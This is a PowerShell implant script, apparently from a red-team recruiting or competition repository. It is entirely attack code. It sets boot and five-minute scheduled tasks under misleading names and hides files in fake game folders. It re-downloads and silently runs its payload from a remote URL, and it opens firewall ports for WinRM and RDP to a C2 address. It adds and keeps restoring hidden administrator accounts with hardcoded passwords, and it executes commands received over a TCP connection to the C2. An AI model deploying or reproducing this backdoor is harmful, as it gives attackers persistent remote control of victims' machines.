param(
    [Parameter(Mandatory=$true)]
    [string]$beaconIPAddress
)

# Create scheduled task for this payload to run on boot
$action = New-ScheduledTaskAction -Execute "C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ConnectionToC2"

# Create the backup script
# The backup script will check to see if the main payload exists.
# If it doesn't this script will redownload the main payload, and start a new process for it
if(!(Test-Path "C:\Program Files (x86)\Webkinz")){
    New-Item -ItemType "Directory" -Path "C:\Program Files (x86)\Webkinz"
}
if(!(Test-Path "C:\Program Files (x86)\Webkinz\backup.ps1")){
    New-Item -ItemType "File" -Path "C:\Program Files (x86)\Webkinz\backup.ps1"
    $backupCommands = "if(!(Test-Path C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1)){"
    $backupCommands += "wget -o C:\ProgramData\EpicGames\Fortnite\windowsTryouts.ps1 `"gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/windowsPayload.ps1`""
    $backupCommands += "Start-Process -FilePath `"powershell.exe`" -ArgumentList `"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1 -BeaconIPAddress $($beaconIPAddress)`" -Verb RunAs}"
    $backupCommands | Out-File "C:\Program Files (x86)\Webkinz\backup.ps1"
}

# Create Scheduled task for the backup script to check for the main payload every 5 minutes
$action = New-ScheduledTaskAction -Execute "C:\Program Files (x86)\Webkinz\backup.ps1"
$trigger = New-ScheduledTaskTrigger -Daily -At 9am -RepetitionInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BackupImportantFiles"

# Set up Firewall rules to make sure the C2 can communicate with the client
netsh adv f a r n="WinRM Default Rule" dir=in act=allow prof=any prot=tcp localport=5985,5986
netsh adv f a r n="WinRM C2 Rule" dir=in act=allow prof=any prot=tcp remoteip=$beaconIPAddress localport=5985,5986
netsh adv f a r n="HTTP Default Rule" dir=out act=allow prof=any prot=tcp remoteport=80,443
netsh adv f a r n="HTTP C2 Rule" dir=out act=allow prof=any prot=tcp remoteip=$beaconIPAddress remoteport=80
netsh adv f a r n="RDP Default Rule" dir=in act=allow prof=any prot=tcp localport=3389
netsh adv f a r n="RDP C2 Rule" dir=out act=allow prof=any prot=tcp remoteip=$beaconIPAddress localport=3389

# Set up TCP connection to the server
$tcpConnection = New-Object System.Net.Sockets.TcpClient($beaconIPAddress, 80)
$tcpStream = $tcpConnection.GetStream()
$reader = New-Object System.IO.StreamReader($tcpStream)
$writer = New-Object System.IO.StreamWriter($tcpStream)
$writer.AutoFlush = $true

# Add some extra users
New-LocalUser -Name "Jimithy" -Password (ConvertTo-SecureString -String "Password-123456" -AsPlainText)
Add-LocalGroupMember -Member "Jimithy" -Group "Administrators"
Add-LocalGroupMember -Member "Jimithy" -Group "Remote Desktop Users"

New-LocalUser -Name "Doug" -Password (ConvertTo-SecureString -String "Password-12345" -AsPlainText)
Add-LocalGroupMember -Member "Doug" -Group "Administrators"
Add-LocalGroupMember -Member "Doug" -Group "Remote Desktop Users"

$I = 0

while($true){
    # every so often check to see if our users are still there
    if($I -ge 4){
        $I = 0
        $Users = Get-LocalUser
        if(!("Jimithy" -in $Users)){
            New-LocalUser -Name "Jimithy" -Password (ConvertTo-SecureString -String "Password-123456")
            Add-LocalGroupMember -Member "Jimithy" -Group "Administrators"
            Add-LocalGroupMember -Member "Jimithy" -Group "Remote Desktop Users"
        }
        if(!("Doug" -in $Users)){
            New-LocalUser -Name "Doug" -Password (ConvertTo-SecureString -String "Password-123456")
            Add-LocalGroupMember -Member "Doug" -Group "Administrators"
            Add-LocalGroupMember -Member "Doug" -Group "Remote Desktop Users"
        }
    }

    # start a new dummy powershell process that does nothing
    $sleepTime = Get-Random -Minimum 5 -Maximum 60
    Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList "-Command Start-Sleep -Seconds $($sleepTime)"

    # Get commands from the C2, run them and send the output back
    $command = $reader.Read()
    $reply = & $command
    $writer.write($reply)
    $I++;
}